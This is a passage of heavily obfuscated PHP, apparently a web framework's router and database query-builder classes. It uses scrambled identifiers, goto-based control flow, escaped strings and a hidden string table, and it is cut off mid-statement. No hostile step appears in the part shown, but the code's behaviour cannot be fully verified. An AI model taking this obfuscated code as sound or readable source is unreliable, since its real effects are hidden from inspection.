$fÕ¼êŠ˜‹) { $DÑ¯âŸ‘Ğ =& $_SERVER[›èö’ù¤]; if ($a¡™Òà‰õ == $DÑ¯âŸ‘Ğ[1499]) { $F˜Ó•ã‡ô = array_map($DÑ¯âŸ‘Ğ[1500], $fÕ¼êŠ˜‹[0]); $BÆ·åÚ˜¢‹ = strpos($fÕ¼êŠ˜‹[1], $DÑ¯âŸ‘Ğ[8]) === 0 ? $fÕ¼êŠ˜‹[1] : $DÑ¯âŸ‘Ğ[8] . $fÕ¼êŠ˜‹[1]; $D³¶åì† = $fÕ¼êŠ˜‹[2]; } else { $F˜Ó•ã‡ô = null; $BÆ·åÚ˜¢‹ = strpos($fÕ¼êŠ˜‹[0], $DÑ¯âŸ‘Ğ[8]) === 0 ? $fÕ¼êŠ˜‹[0] : $DÑ¯âŸ‘Ğ[8] . $fÕ¼êŠ˜‹[0]; $D³¶åì† = $fÕ¼êŠ˜‹[1]; } array_push(self::$maps, $F˜Ó•ã‡ô); array_push(self::$routes, $BÆ·åÚ˜¢‹); array_push(self::$methods, strtoupper($a¡™Òà‰õ)); array_push(self::$callbacks, $D³¶åì†); } public static function error($EŞÇê”»¦) { self::$errorCallback = $EŞÇê”»¦; } public static function haltOnMatch($eŸ·ÎÅÒŞÎ = true) { self::$halts = $eŸ·ÎÅÒŞÎ; } public static function dispatch() { goto Bó§»ÀÜ×È; Bó§»ÀÜ×È: $Bª©Ä·ë¦ =& $_SERVER[›èö’ù¤]; $B‘äÂâ×É = parse_url($_SERVER[$Bª©Ä·ë¦[1501]], PHP_URL_PATH); $D«áõ¡ëÅÅ = $_SERVER[$Bª©Ä·ë¦[157]]; goto eãÌ®®¢Êî; EÅ»Ïíù°Ş: self::$routes = preg_replace($Bª©Ä·ë¦[1188], $Bª©Ä·ë¦[8], self::$routes); if (in_array($B‘äÂâ×É, self::$routes)) { $c„¬­Õîç‰ = array_keys(self::$routes, $B‘äÂâ×É); foreach ($c„¬­Õîç‰ as $eÜ‹Ö‹‚÷¸) { if (self::$methods[$eÜ‹Ö‹‚÷¸] == $D«áõ¡ëÅÅ || self::$methods[$eÜ‹Ö‹‚÷¸] == $Bª©Ä·ë¦[1502] || in_array($D«áõ¡ëÅÅ, self::$maps[$eÜ‹Ö‹‚÷¸])) { $B¶Ïºã •Ê = !0; if (!is_object(self::$callbacks[$eÜ‹Ö‹‚÷¸])) { $EË±™¯’ = explode($Bª©Ä·ë¦[8], self::$callbacks[$eÜ‹Ö‹‚÷¸]); $bŒ£à¼‰ä = end($EË±™¯’); $BÕµíÓÜÉõ = explode($Bª©Ä·ë¦[1503], $bŒ£à¼‰ä); $f¥É¯˜¬ê² = new $BÕµíÓÜÉõ[0](); $f¥É¯˜¬ê²->{$BÕµíÓÜÉõ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$eÜ‹Ö‹‚÷¸]); if (self::$halts) { return; } } } } } else { $BŸ‡Â×ÍĞ = 0; foreach (self::$routes as $eÜ‹Ö‹‚÷¸) { if (strpos($eÜ‹Ö‹‚÷¸, $Bª©Ä·ë¦[4]) !== !1) { $eÜ‹Ö‹‚÷¸ = str_replace($b»â¾À¯ÒÒ, $dÅ¯–ŞÜæŞ, $eÜ‹Ö‹‚÷¸); } if (preg_match($Bª©Ä·ë¦[1504] . $eÜ‹Ö‹‚÷¸ . $Bª©Ä·ë¦[1505], $B‘äÂâ×É, $cÍöíİ¢†)) { if (self::$methods[$BŸ‡Â×ÍĞ] == $D«áõ¡ëÅÅ || self::$methods[$BŸ‡Â×ÍĞ] == $Bª©Ä·ë¦[1502] || !empty(self::$maps[$BŸ‡Â×ÍĞ]) && in_array($D«áõ¡ëÅÅ, self::$maps[$BŸ‡Â×ÍĞ])) { $B¶Ïºã •Ê = !0; array_shift($cÍöíİ¢†); if (!is_object(self::$callbacks[$BŸ‡Â×ÍĞ])) { $EË±™¯’ = explode($Bª©Ä·ë¦[8], self::$callbacks[$BŸ‡Â×ÍĞ]); $bŒ£à¼‰ä = end($EË±™¯’); $BÕµíÓÜÉõ = explode($Bª©Ä·ë¦[1503], $bŒ£à¼‰ä); $f¥É¯˜¬ê² = new $BÕµíÓÜÉõ[0](); if (!method_exists($f¥É¯˜¬ê², $BÕµíÓÜÉõ[1])) { echo $Bª©Ä·ë¦[1506]; } else { call_user_func_array(array($f¥É¯˜¬ê², $BÕµíÓÜÉõ[1]), $cÍöíİ¢†); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$BŸ‡Â×ÍĞ], $cÍöíİ¢†); if (self::$halts) { return; } } } } $BŸ‡Â×ÍĞ++; } } if ($B¶Ïºã •Ê == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $b˜¯ğØÕÌÂ =& $_SERVER[›èö’ù¤]; header($_SERVER[$b˜¯ğØÕÌÂ[1507]] . $b˜¯ğØÕÌÂ[1508]); echo $b˜¯ğØÕÌÂ[1509]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Bª©Ä·ë¦[1501]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto CÌÎà•¶õ¥; eãÌ®®¢Êî: $b»â¾À¯ÒÒ = array_keys(static::$patterns); $dÅ¯–ŞÜæŞ = array_values(static::$patterns); $B¶Ïºã •Ê = !1; goto EÅ»Ïíù°Ş; CÌÎà•¶õ¥: } } goto b•æÎ®—ÓĞ; d¡†ç…—ö: class DbSqlite extends DbSqliteBase { public function query($a“”É«§®è) { $CÙ¶Ô»ÔÃâ =& $_SERVER[›èö’ù¤]; if (!CacheLock::fileLock($CÙ¶Ô»ÔÃâ[9])) { return !1; } $EÍ¿É¥ªÙî = parent::query($a“”É«§®è); CacheLock::fileUnLock($CÙ¶Ô»ÔÃâ[9]); return $EÍ¿É¥ªÙî; } public function execute($d‚œãÁÏƒ„) { $A´é‹À ‘­ =& $_SERVER[›èö’ù¤]; if (!CacheLock::fileLock($A´é‹À ‘­[9])) { return !1; } $f™ƒÉó¶ï… = parent::execute($d‚œãÁÏƒ„); CacheLock::fileUnLock($A´é‹À ‘­[9]); return $f™ƒÉó¶ï…; } } class DbSqlite3 extends DbSqlite3Base { public function query($b¨¦Ñ…à) { $F“¥ñ„øãÏ =& $_SERVER[›èö’ù¤]; if (!CacheLock::fileLock($F“¥ñ„øãÏ[9])) { return !1; } $B°†ËğİÌ = parent::query($b¨¦Ñ…à); CacheLock::fileUnLock($F“¥ñ„øãÏ[9]); return $B°†ËğİÌ; } public function execute($bÛÓ”¨¯…¯) { $e½Á®½ =& $_SERVER[›èö’ù¤]; if (!CacheLock::fileLock($e½Á®½[9])) { return !1; } $cİïµ‰´ö = parent::execute($bÛÓ”¨¯…¯); CacheLock::fileUnLock($e½Á®½[9]); return $cİïµ‰´ö; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\x69\156\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\x3d", "\x6e\x65\161" => "\74\x3e", "\x67\x74" => "\76", "\145\x67\164" => "\x3e\75", "\x6c\164" => "\x3c", "\x65\154\164" => "\74\75", "\x6e\157\x74\x6c\x69\153\145" => "\x4e\117\124\40\114\x49\113\105", "\x6c\x69\x6b\x65" => "\x4c\111\x4b\105", "\x69\156" => "\x49\116", "\156\157\164\x69\156" => "\116\x4f\124\40\111\x4e", "\156\x6f\x74\40\x69\156" => "\x4e\117\124\x20\x49\x4e", "\142\145\x74\x77\145\x65\x6e" => "\102\x45\124\x57\105\105\x4e", "\156\157\164\142\x65\x74\x77\145\145\156" => "\x4e\x4f\x54\x20\102\105\x54\x57\x45\x45\116", "\156\x6f\164\x20\x62\x65\x74\167\x65\x65\x6e" => "\x4e\x4f\x54\40\102\x45\124\127\105\x45\116"); protected $selectSql = "\123\x45\114\x45\x43\124\45\x44\x49\123\124\111\116\x43\x54\45\x20\x25\106\111\x45\114\104\x25\x20\106\x52\x4f\115\40\x25\x54\101\102\114\105\45\45\x4a\x4f\x49\x4e\x25\45\x57\x48\105\122\x45\45\x25\x47\x52\x4f\125\120\45\x25\x48\101\x56\111\x4e\x47\45\x25\117\x52\x44\x45\122\x25\x25\x4c\x49\x4d\111\124\x25\x20\45\x55\x4e\x49\x4f\x4e\x25\x25\x43\117\115\x4d\x45\116\124\45"; protected $bind = array(); public static function getInstance() { $D“Ä—Å­§ˆ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[›èö’ù¤][945], $D“Ä—Å­§ˆ); } public function factory($dË»ˆİ¬Ø± = '') { goto D«Ê¥õõÆÛ; D±ù²¯§Ôæ: return $a‡à¾áà©; goto eËƒŞ¸‘‘×; D«Ê¥õõÆÛ: $dÖ„­ÊåÉÂ =& $_SERVER[›èö’ù¤]; $dË»ˆİ¬Ø± = $this->parseConfig($dË»ˆİ¬Ø±); if (empty($dË»ˆİ¬Ø±[$dÖ„­ÊåÉÂ[946]])) { think_exception(think_lang($dÖ„­ÊåÉÂ[947])); } goto CŠ¸ÉšÉ§Ú; CŠ¸ÉšÉ§Ú: $this->dbType = ucwords(strtolower($dË»ˆİ¬Ø±[$dÖ„­ÊåÉÂ[946]])); $eâÑÀ‰¦‰‡ = $dÖ„­ÊåÉÂ[948] . $this->dbType; if (class_exists($eâÑÀ‰¦‰‡)) { $a‡à¾áà© = new $eâÑÀ‰¦‰‡($dË»ˆİ¬Ø±); if ($dÖ„­ÊåÉÂ[781] != strtolower($dË»ˆİ¬Ø±[$dÖ„­ÊåÉÂ[946]])) { $a‡à¾áà©->dbType = strtoupper($this->dbType); } else { $a‡à¾áà©->dbType = $this->_getDsnType($dË»ˆİ¬Ø±[$dÖ„­ÊåÉÂ[901]]); } } else { think_exception(think_lang($dÖ„­ÊåÉÂ[949]) . $dÖ„­ÊåÉÂ[950] . $eâÑÀ‰¦‰‡); } goto D±ù²¯§Ôæ; eËƒŞ¸‘‘×: } public function __call($F˜š’°¬†, $eâ§Ã÷…¬Å) { if (method_exists($this, $F˜š’°¬†)) { return call_user_func_array(array($this, $F˜š’°¬†), $eâ§Ã÷…¬Å); } } protected function _getDsnType($Dçµóµ‹) { $CŸğã±Í¿æ = explode($_SERVER[›èö’ù¤][4], $Dçµóµ‹); $D²Ò³Ë¨Æî = strtoupper(trim($CŸğã±Í¿æ[0])); return $D²Ò³Ë¨Æî; } private function parseConfig($EÏ¯¿—´¢ò = '') { $a–Â“ÃÑ‚ =& $_SERVER[›èö’ù¤]; if (!empty($EÏ¯¿—´¢ò) && is_string($EÏ¯¿—´¢ò)) { $EÏ¯¿—´¢ò = $this->parseDSN($EÏ¯¿—´¢ò); } elseif (is_array($EÏ¯¿—´¢ò)) { $EÏ¯¿—´¢ò = array_change_key_case($EÏ¯¿—´¢ò); $EÏ¯¿—´¢ò = array($a–Â“ÃÑ‚[946] => $EÏ¯¿—´¢ò[$a–Â“ÃÑ‚[780]], $a–Â“ÃÑ‚[874] => $EÏ¯¿—´¢ò[$a–Â“ÃÑ‚[951]], $a–Â“ÃÑ‚[875] => $EÏ¯¿—´¢ò[$a–Â“ÃÑ‚[952]], $a–Â“ÃÑ‚[872] => $EÏ¯¿—´¢ò[$a–Â“ÃÑ‚[953]], $a–Â“ÃÑ‚[873] => $EÏ¯¿—´¢ò[$a–Â“ÃÑ‚[954]], $a–Â“ÃÑ‚[17] => $EÏ¯¿—´¢ò[$a–Â“ÃÑ‚[955]], $a–Â“ÃÑ‚[901] => $EÏ¯¿—´¢ò[$a–Â“ÃÑ‚[782]], $a–Â“ÃÑ‚[13] => isset($EÏ¯¿—´¢ò[$a–Â“ÃÑ‚[956]]) ? $EÏ¯¿—´¢ò[$a–Â“ÃÑ‚[956]] : array()); } elseif (empty($EÏ¯¿—´¢ò)) { if (think_config($a–Â“ÃÑ‚[957]) && $a–Â“ÃÑ‚[781] != strtolower(think_config($a–Â“ÃÑ‚[958]))) { $EÏ¯¿—´¢ò = $this->parseDSN(think_config($a–Â“ÃÑ‚[957])); } else { $EÏ¯¿—´¢ò = array($a–Â“ÃÑ‚[946] => think_config($a–Â“ÃÑ‚[958]), $a–Â“ÃÑ‚[874] => think_config($a–Â“ÃÑ‚[959]), $a–Â“ÃÑ‚[875] => think_config($a–Â“ÃÑ‚[960]), $a–Â“ÃÑ‚[872] => think_config($a–Â“ÃÑ‚[961]), $a–Â“ÃÑ‚[873] => think_config($a–Â“ÃÑ‚[962]), $a–Â“ÃÑ‚[17] => think_config($a–Â“ÃÑ‚[244]), $a–Â“ÃÑ‚[901] => think_config($a–Â“ÃÑ‚[957]), $a–Â“ÃÑ‚[13] => think_config($a–Â“ÃÑ‚[963])); } } return $EÏ¯¿—´¢ò; } protected function initConnect($C…²ÓöãÍ = true) { if (1 == think_config($_SERVER[›èö’ù¤][18])) { $this->_linkID = $this->multiConnect($C…²ÓöãÍ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $AÓù¤Ú¡‡ó => $F•ŠŞ‹´) { $this->_linkID = $F•ŠŞ‹´; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($A„—¡¹¤ïÆ = false) { goto A¶ÚÖÖ´º¸; dø¨ëÄÚ’Ş: if (empty($D¶Óâ£²ì)) { foreach ($this->config as $cáî£ªçĞ => $c¢é†©ù…Ğ) { $D¶Óâ£²ì[$cáî£ªçĞ] = explode($A›ñ ÔÈïİ[47], $c¢é†©ù…Ğ); } } if (think_config($A›ñ ÔÈïİ[964])) { if ($A„—¡¹¤ïÆ || think_config($A›ñ ÔÈïİ[391]) === !0) { $A‹äÏÑÊğ = floor(mt_rand(0, think_config($A›ñ ÔÈïİ[965]) - 1)); $C»Û†Šñ¯š = $A‹äÏÑÊğ; } else { if (is_numeric(think_config($A›ñ ÔÈïİ[966]))) { $A‹äÏÑÊğ = think_config($A›ñ ÔÈïİ[966]); } else { $A‹äÏÑÊğ = floor(mt_rand(think_config($A›ñ ÔÈïİ[965]), count($D¶Óâ£²ì[$A›ñ ÔÈïİ[872]]) - 1)); } } } else { $A‹äÏÑÊğ = floor(mt_rand(0, count($D¶Óâ£²ì[$A›ñ ÔÈïİ[872]]) - 1)); $C»Û†Šñ¯š = $A‹äÏÑÊğ; } $A‹äÏÑÊğ = $C»Û†Šñ¯š !== -1 ? $C»Û†Šñ¯š : $A‹äÏÑÊğ; goto a¿ ˜©ˆ; A¶ÚÖÖ´º¸: $A›ñ ÔÈïİ =& $_SERVER[›èö’ù¤]; static $D¶Óâ£²ì = array(); static $C»Û†Šñ¯š = -1; goto dø¨ëÄÚ’Ş; a¿ ˜©ˆ: $e‡¦§àÄ½… = array($A›ñ ÔÈïİ[874] => isset($D¶Óâ£²ì[$A›ñ ÔÈïİ[874]][$A‹äÏÑÊğ]) ? $D¶Óâ£²ì[$A›ñ ÔÈïİ[874]][$A‹äÏÑÊğ] : $D¶Óâ£²ì[$A›ñ ÔÈïİ[874]][0], $A›ñ ÔÈïİ[875] => isset($D¶Óâ£²ì[$A›ñ ÔÈïİ[875]][$A‹äÏÑÊğ]) ? $D¶Óâ£²ì[$A›ñ ÔÈïİ[875]][$A‹äÏÑÊğ] : $D¶Óâ£²ì[$A›ñ ÔÈïİ[875]][0], $A›ñ ÔÈïİ[872] => isset($D¶Óâ£²ì[$A›ñ ÔÈïİ[872]][$A‹äÏÑÊğ]) ? $D¶Óâ£²ì[$A›ñ ÔÈïİ[872]][$A‹äÏÑÊğ] : $D¶Óâ£²ì[$A›ñ ÔÈïİ[872]][0], $A›ñ ÔÈïİ[873] => isset($D¶Óâ£²ì[$A›ñ ÔÈïİ[873]][$A‹äÏÑÊğ]) ? $D¶Óâ£²ì[$A›ñ ÔÈïİ[873]][$A‹äÏÑÊğ] : $D¶Óâ£²ì[$A›ñ ÔÈïİ[873]][0], $A›ñ ÔÈïİ[17] => isset($D¶Óâ£²ì[$A›ñ ÔÈïİ[17]][$A‹äÏÑÊğ]) ? $D¶Óâ£²ì[$A›ñ ÔÈïİ[17]][$A‹äÏÑÊğ] : $D¶Óâ£²ì[$A›ñ ÔÈïİ[17]][0], $A›ñ ÔÈïİ[901] => isset($D¶Óâ£²ì[$A›ñ ÔÈïİ[901]][$A‹äÏÑÊğ]) ? $D¶Óâ£²ì[$A›ñ ÔÈïİ[901]][$A‹äÏÑÊğ] : $D¶Óâ£²ì[$A›ñ ÔÈïİ[901]][0], $A›ñ ÔÈïİ[13] => isset($D¶Óâ£²ì[$A›ñ ÔÈïİ[13]][$A‹äÏÑÊğ]) ? $D¶Óâ£²ì[$A›ñ ÔÈïİ[13]][$A‹äÏÑÊğ] : $D¶Óâ£²ì[$A›ñ ÔÈïİ[13]][0]); return $this->connect($e‡¦§àÄ½…, $A‹äÏÑÊğ); goto cç“†ÖêŞ³; cç“†ÖêŞ³: } public function parseDSN($cÃƒŒ×Ù‚’) { $dçì‹öƒÎ =& $_SERVER[›èö’ù¤]; if (empty($cÃƒŒ×Ù‚’)) { return !1; } $B…¼²¸™‚Å = parse_url($cÃƒŒ×Ù‚’); if ($B…¼²¸™‚Å[$dçì‹öƒÎ[174]]) { $bèÍù¿«œ = array($dçì‹öƒÎ[946] => $B…¼²¸™‚Å[$dçì‹öƒÎ[174]], $dçì‹öƒÎ[874] => isset($B…¼²¸™‚Å[$dçì‹öƒÎ[589]]) ? $B…¼²¸™‚Å[$dçì‹öƒÎ[589]] : $dçì‹öƒÎ[33], $dçì‹öƒÎ[875] => isset($B…¼²¸™‚Å[$dçì‹öƒÎ[967]]) ? $B…¼²¸™‚Å[$dçì‹öƒÎ[967]] : $dçì‹öƒÎ[33], $dçì‹öƒÎ[872] => isset($B…¼²¸™‚Å[$dçì‹öƒÎ[175]]) ? $B…¼²¸™‚Å[$dçì‹öƒÎ[175]] : $dçì‹öƒÎ[33], $dçì‹öƒÎ[873] => isset($B…¼²¸™‚Å[$dçì‹öƒÎ[176]]) ? $B…¼²¸™‚Å[$dçì‹öƒÎ[176]] : $dçì‹öƒÎ[33], $dçì‹öƒÎ[17] => isset($B…¼²¸™‚Å[$dçì‹öƒÎ[76]]) ? substr($B…¼²¸™‚Å[$dçì‹öƒÎ[76]], 1) : $dçì‹öƒÎ[33]); } else { preg_match($dçì‹öƒÎ[968], trim($cÃƒŒ×Ù‚’), $DÒ›ˆµ±Ñ¯); $bèÍù¿«œ = array($dçì‹öƒÎ[946] => $DÒ›ˆµ±Ñ¯[1], $dçì‹öƒÎ[874] => $DÒ›ˆµ±Ñ¯[2], $dçì‹öƒÎ[875] => $DÒ›ˆµ±Ñ¯[3], $dçì‹öƒÎ[872] => $DÒ›ˆµ±Ñ¯[4], $dçì‹öƒÎ[873] => $DÒ›ˆµ±Ñ¯[5], $dçì‹öƒÎ[17] => $DÒ›ˆµ±Ñ¯[6]); } $bèÍù¿«œ[$dçì‹öƒÎ[901]] = $dçì‹öƒÎ[33]; return $bèÍù¿«œ; } protected function debug() { $b’Šóö®÷ =& $_SERVER[›èö’ù¤]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $b’Šóö®÷[969]; if (think_config($b’Šóö®÷[970])) { think_status($b’Šóö®÷[971]); think_trace($this->queryStr . $b’Šóö®÷[972] . think_status($b’Šóö®÷[20], $b’Šóö®÷[971], 6) . $b’Šóö®÷[973], $b’Šóö®÷[33], $b’Šóö®÷[974]); } } protected function parseLock($EäíºÍ¨‹Í = false) { $bì‹›ô¹ò· =& $_SERVER[›èö’ù¤]; if (!$EäíºÍ¨‹Í) { return $bì‹›ô¹ò·[33]; } if ($bì‹›ô¹ò·[903] == $this->dbType) { return $bì‹›ô¹ò·[975]; } return $bì‹›ô¹ò·[976]; } protected function parseSet($e¢È«î‘”–) { $CÀëãØŒ‚å =& $_SERVER[›èö’ù¤]; foreach ($e¢È«î‘”– as $FÃ£µâÇëĞ => $C¸î½¬°¼Ç) { if (is_array($C¸î½¬°¼Ç) && $CÀëãØŒ‚å[295] == $C¸î½¬°¼Ç[0]) { $cà©‚œ¤¸Ó[] = $this->parseKey($FÃ£µâÇëĞ) . $CÀëãØŒ‚å[977] . $C¸î½¬°¼Ç[1]; } elseif (is_scalar($C¸î½¬°¼Ç) || is_null($C¸î½¬°¼Ç)) { $cà©‚œ¤¸Ó[] = $this->parseKey($FÃ£µâÇëĞ) . $CÀëãØŒ‚å[977] . $this->parseValue($C¸î½¬°¼Ç); } } return $CÀëãØŒ‚å[978] . implode($CÀëãØŒ‚å[47], $cà©‚œ¤¸Ó); } protected function bindParam($BİÏòÎÇ¯™, $EÛò¿‚ßÙ¬) { $this->bind[$_SERVER[›èö’ù¤][4] . $BİÏòÎÇ¯™] = $EÛò¿‚ßÙ¬; } protected function parseBind($CĞ¾³œÄíè) { $CĞ¾³œÄíè = array_merge($this->bind, $CĞ¾³œÄíè); $this->bind = array(); return $CĞ¾³œÄíè; } function parseKey(&$CÅ¶ºõ„ß, $F«äÏ„¢‹÷ = true) { if ($F«äÏ„¢‹÷) { $CÅ¶ºõ„ß = $this->parseKeyCheck($CÅ¶ºõ„ß); } return $CÅ¶ºõ„ß; } function parseKeyCheck($bâÁ„Ç½) { $bîÁ³æİä =& $_SERVER[›èö’ù¤]; $bâÁ„Ç½ = trim($bâÁ„Ç½); if (!preg_match($bîÁ³æİä[979], $bâÁ„Ç½)) { think_exception($bîÁ³æİä[980] . $bâÁ„Ç½); } return $bâÁ„Ç½; } protected function parseValue($aÖÕ‹Ûƒ†Ù) { $FÌƒåôÒ¯Õ =& $_SERVER[›èö’ù¤]; if (is_string($aÖÕ‹Ûƒ†Ù)) { $aÖÕ‹Ûƒ†Ù = $FÌƒåôÒ¯Õ[942] . $this->escapeString($aÖÕ‹Ûƒ†Ù) . $FÌƒåôÒ¯Õ[942]; } elseif (isset($aÖÕ‹Ûƒ†Ù[0]) && is_string($aÖÕ‹Ûƒ†Ù[0]) && strtolower($aÖÕ‹Ûƒ†Ù[0]) == $FÌƒåôÒ¯Õ[295]) { $aÖÕ‹Ûƒ†Ù = $this->escapeString($aÖÕ‹Ûƒ†Ù[1]); } elseif (is_array($aÖÕ‹Ûƒ†Ù)) { $aÖÕ‹Ûƒ†Ù = array_map(array($this, $FÌƒåôÒ¯Õ[943]), $aÖÕ‹Ûƒ†Ù); } elseif (is_bool($aÖÕ‹Ûƒ†Ù)) { $aÖÕ‹Ûƒ†Ù = $aÖÕ‹Ûƒ†Ù ? $FÌƒåôÒ¯Õ[87] : $FÌƒåôÒ¯Õ[191]; } elseif (is_null($aÖÕ‹Ûƒ†Ù)) { $aÖÕ‹Ûƒ†Ù = $FÌƒåôÒ¯Õ[103]; } return $aÖÕ‹Ûƒ†Ù; } protected function parseField($b–»–¶ßä) { $d••ºšæ®® =& $_SERVER[›èö’ù¤]; if (is_string($b–»–¶ßä) && strpos($b–»–¶ßä, $d••ºšæ®®[47])) { $b–»–¶ßä = explode($d••ºšæ®®[47], $b–»–¶ßä); } if (is_array($b–»–¶ßä)) { $fÃù…“Ï˜ë = array(); foreach ($b–»–¶ßä as $f¨ÈÃÎÚÂª => $c˜ŠÉ Êİ¦) { if (!is_numeric($f¨ÈÃÎÚÂª)) { $fÃù…“Ï˜ë[] = $this->parseKey($f¨ÈÃÎÚÂª, !1) . $d••ºšæ®®[981] . $this->parseKey($c˜ŠÉ Êİ¦); } else { $fÃù…“Ï˜ë[] = $this->parseKey($c˜ŠÉ Êİ¦); } } $CçÈ·ïŒæ¹ = implode($d••ºšæ®®[47], $fÃù…“Ï˜ë); } elseif (is_string($b–»–¶ßä) && !empty($b–»–¶ßä)) { $CçÈ·ïŒæ¹ = $b–»–¶ßä; } else { $CçÈ·ïŒæ¹ = $d••ºšæ®®[182]; } return $CçÈ·ïŒæ¹; } protected function parseTable($eà¿µõİÔâ) { $f¾±¶Œò  =& $_SERVER[›èö’ù¤]; if (is_array($eà¿µõİÔâ)) { $A‡ˆ Óœ = array(); foreach ($eà¿µõİÔâ as $d†‘™ÄèŒĞ => $f»í•±¯¾º) { if (!is_numeric($d†‘™ÄèŒĞ)) { $A‡ˆ Óœ[] = $this->parseKey($d†‘™ÄèŒĞ) . $f¾±¶Œò [50] . $this->parseKey($f»í•±¯¾º); } else { $A‡ˆ Óœ[] = $this->parseKey($d†‘™ÄèŒĞ); } } $eà¿µõİÔâ = $A‡ˆ Óœ; } elseif (is_string($eà¿µõİÔâ)) { if (strstr($eà¿µõİÔâ, $f¾±¶Œò [50])) { return $eà¿µõİÔâ; } $eà¿µõİÔâ = explode($f¾±¶Œò [47], $eà¿µõİÔâ); array_walk($eà¿µõİÔâ, array($this, $f¾±¶Œò [892])); } return $f¾±¶Œò [886] . trim(implode($f¾±¶Œò [982], $eà¿µõİÔâ), $f¾±¶Œò [383]) . $f¾±¶Œò [886]; } protected function parseWhere($C…Øï İó˜) { $BÕß¸è½Œš =& $_SERVER[›èö’ù¤]; $c·ŒÖ”İë = $BÕß¸è½Œš[33]; if (is_string($C…Øï İó˜)) { $c·ŒÖ”İë = $C…Øï İó˜; } else { $C¶Ê›ÂÔô = isset($C…Øï İó˜[$BÕß¸è½Œš[983]]) ? strtoupper($C…Øï İó˜[$BÕß¸è½Œš[983]]) : $BÕß¸è½Œš[33]; if (in_array($C¶Ê›ÂÔô, array($BÕß¸è½Œš[984], $BÕß¸è½Œš[985], $BÕß¸è½Œš[986]))) { $C¶Ê›ÂÔô = $BÕß¸è½Œš[50] . $C¶Ê›ÂÔô . $BÕß¸è½Œš[50]; unset($C…Øï İó˜[$BÕß¸è½Œš[983]]); } else { $C¶Ê›ÂÔô = $BÕß¸è½Œš[987]; } foreach ($C…Øï İó˜ as $e‚ØÌŠĞ => $b‹óÇº¤) { $c·ŒÖ”İë .= $BÕß¸è½Œš[275]; if (is_numeric($e‚ØÌŠĞ)) { $e‚ØÌŠĞ = $BÕß¸è½Œš[988]; } if (0 === strpos($e‚ØÌŠĞ, $BÕß¸è½Œš[71])) { $c·ŒÖ”İë .= $this->parseThinkWhere($e‚ØÌŠĞ, $b‹óÇº¤); } else { if (!preg_match($BÕß¸è½Œš[989], trim($e‚ØÌŠĞ))) { think_exception(think_lang($BÕß¸è½Œš[990]) . $BÕß¸è½Œš[4] . $e‚ØÌŠĞ); } $dŸÂ°İ«–¢ = is_array($b‹óÇº¤) && isset($b‹óÇº¤[$BÕß¸è½Œš[991]]); $e‚ØÌŠĞ = trim($e‚ØÌŠĞ); if (strpos($e‚ØÌŠĞ, $BÕß¸è½Œš[281])) { $aÖ¿í¶Ò¡à = explode($BÕß¸è½Œš[281], $e‚ØÌŠĞ); $b¦÷‚¿«ÁÇ = array(); foreach ($aÖ¿í¶Ò¡à as $EŠƒªÁèµ„ => $D±ªâñèë) { $f˜¬ëœ§ë = $dŸÂ°İ«–¢ ? $b‹óÇº¤[$EŠƒªÁèµ„] : $b‹óÇº¤; $b¦÷‚¿«ÁÇ[] = $BÕß¸è½Œš[258] . $this->parseWhereItem($this->parseKey($D±ªâñèë), $f˜¬ëœ§ë) . $BÕß¸è½Œš[891]; } $c·ŒÖ”İë .= implode($BÕß¸è½Œš[992], $b¦÷‚¿«ÁÇ); } elseif (strpos($e‚ØÌŠĞ, $BÕß¸è½Œš[282])) { $aÖ¿í¶Ò¡à = explode($BÕß¸è½Œš[282], $e‚ØÌŠĞ); $b¦÷‚¿«ÁÇ = array(); foreach ($aÖ¿í¶Ò¡à as $EŠƒªÁèµ„ => $D±ªâñèë) { $f˜¬ëœ§ë = $dŸÂ°İ«–¢ ? $b‹óÇº¤[$EŠƒªÁèµ„] : $b‹óÇº¤; $b¦÷‚¿«ÁÇ[] = $BÕß¸è½Œš[258] . $this->parseWhereItem($this->parseKey($D±ªâñèë), $f˜¬ëœ§ë) . $BÕß¸è½Œš[891]; } $c·ŒÖ”İë .= implode($BÕß¸è½Œš[987], $b¦÷‚¿«ÁÇ); } else { $c·ŒÖ”İë .= $this->parseWhereItem($this->parseKey($e‚ØÌŠĞ), $b‹óÇº¤); } } $c·ŒÖ”İë .= $BÕß¸è½Œš[276] . $C¶Ê›ÂÔô; } $c·ŒÖ”İë = substr($c·ŒÖ”İë, 0, -strlen($C¶Ê›ÂÔô)); } return empty($c·ŒÖ”İë) ? $BÕß¸è½Œš[33] : $BÕß¸è½Œš[993] . $c·ŒÖ”İë; } protected function parseWhereItem($Fğõß§îŠ, $DñÃÜã‘ºˆ) { $dË’©§ğØ =& $_SERVER[›èö’ù¤]; $a˜ƒ² º = $dË’©§ğØ[33]; if (is_array($DñÃÜã‘ºˆ)) { if (is_string($DñÃÜã‘ºˆ[0])) { $aö–À“•Õ = strtolower($DñÃÜã‘ºˆ[0]); if (in_array($DñÃÜã‘ºˆ[0], array($dË’©§ğØ[977], $dË’©§ğØ[994], $dË’©§ğØ[995], $dË’©§ğØ[996], $dË’©§ğØ[997], $dË’©§ğØ[998]))) { $a˜ƒ² º .= $Fğõß§îŠ . $dË’©§ğØ[50] . $DñÃÜã‘ºˆ[0] . $dË’©§ğØ[50] . $this->parseValue($DñÃÜã‘ºˆ[1]); } elseif (preg_match($dË’©§ğØ[999], $DñÃÜã‘ºˆ[0])) { $a˜ƒ² º .= $Fğõß§îŠ . $dË’©§ğØ[50] . $this->exp[$aö–À“•Õ] . $dË’©§ğØ[50] . $this->parseValue($DñÃÜã‘ºˆ[1]); } elseif 